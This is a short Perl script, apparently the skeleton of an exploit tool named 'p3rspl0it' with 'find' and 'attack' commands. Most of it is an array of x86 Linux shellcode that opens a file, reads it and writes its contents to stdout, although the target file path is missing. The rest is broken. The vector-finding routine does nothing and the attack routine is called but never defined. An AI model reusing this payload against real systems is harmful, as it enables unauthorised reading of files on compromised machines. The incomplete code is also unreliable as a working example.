#!/usr/bin/env perl

use strict;
use warnings;
use feature qw(switch);

my @shellcode = ("\x31", "\xc0", "\x31", "\xdb", "\x31", "\xc9", 
		 "\x31", "\xd2", "\xeb", "\x32", "\x5b", "\xb0",
		 "\x05", "\x31", "\xc9", "\xcd", "\x80", "\x89", 
		 "\xc6", "\xeb", "\x06", "\xb0", "\x01", "\x31", 
		 "\xdb", "\xcd", "\x80", "\x89", "\xf3", "\xb0", 
		 "\x03", "\x83", "\xec", "\x01", "\x8d", "\x0c", 
		 "\x24", "\xb2", "\x01", "\xcd", "\x80", "\x31", 
		 "\xdb", "\x39", "\xc3", "\x74", "\xe6", "\xb0", 
		 "\x04", "\xb3", "\x01", "\xb2", "\x01", "\xcd", 
		 "\x80", "\x83", "\xc4", "\x01", "\xeb", "\xdf", 
		 "\xe8", "\xc9", "\xff", "\xff", "\xff");

sub find_vector() {
    my $target = $ARGV[1];
    my $buffer = 1;


}

unless( $ARGV[0] ) {
    print "Usage: ./p3rspl0it command target\n";
    exit
}

given($ARGV[0]) {
    when("find") {
        print find_vector();
    }
    when("attack") {
        attack_target()
    }
    default {
        print "Command has to be find or attack";
    }
}


